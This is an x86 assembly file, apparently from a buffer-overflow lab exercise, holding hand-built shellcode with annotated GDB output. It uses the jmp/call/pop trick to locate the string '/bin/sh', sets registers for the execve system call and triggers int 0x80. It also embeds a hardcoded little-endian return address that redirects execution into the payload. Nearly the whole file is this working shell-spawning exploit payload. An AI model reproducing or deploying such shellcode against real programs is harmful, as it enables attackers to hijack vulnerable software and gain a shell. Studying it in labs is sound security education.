
;Program received signal SIGSEGV, Segmentation fault.
; 0xc289c031 in ?? ()
; Cannot access memory at address 0xc289c031





; This is buffer_overflow.c


;;;;;; Above this line is part of our model for how we get to our
;;;;;; function pointer to call based upon ascii variable decoded in read buffer.

; create a label so we know where to start looking when
; we write the patch file.
; Based upon the stuff for the model above, this will be 0xbffff350
initialStart:
	jmp theCall

; Release the kracken
theKracken:
	pop esp

; This is our goal
; (gdb) print /x $eax
; $3 = 0xb                       system call number
; (gdb) print /x $ebx
; $4 = 0xbffff374                pointer to string
; (gdb) print /x $ecx
; $5 = 0xbffff37c                pointer to pointer to string
; (gdb) print /x $edx
; $6 = 0x0						 null pointer
; (gdb) x/4w 0xbffff374
; 0xbffff374:     0x6e69622f      0x0068732f      0xbffff374      0x00000000


; Prepare execv parms in the regs per abi
; Load the string pointers for parm 1 and 2
    mov ebx, esp  ; ebx is a pointer to string
	add esp, 8		; point to next word
	mov [esp], ebx	; put pointer in the word
	mov ecx, esp  ; ecx is a pointer to a pointer to string
; Add code to create null pointer for exec syscall
	mov    eax, ecx ; edx will point to next location
	add    eax, 4
	nop
	nop
	jmp resumeHere

; Our segfault shows we are trying to use this location
; as a return address.  Patch it to jump to start of 
; our shell code. ie place address of intialStart label here.
; dd 0xbffff696 I want but its little endian
db 0x86
db 0xf6
db 0xff
db 0xbf


; We want to resume here
resumeHere:
	xor    edx, edx
	mov    [eax], edx ; now edx points to a zero word
; Load the execv system call
	xor eax, eax ; eax is zero again
	mov edx, eax
	add eax, 0xb ; now its the execv syscall
; Do a system call
	int 0x80
	


theCall:
	call theKracken


execvCmdString: db '/bin/sh',0x0

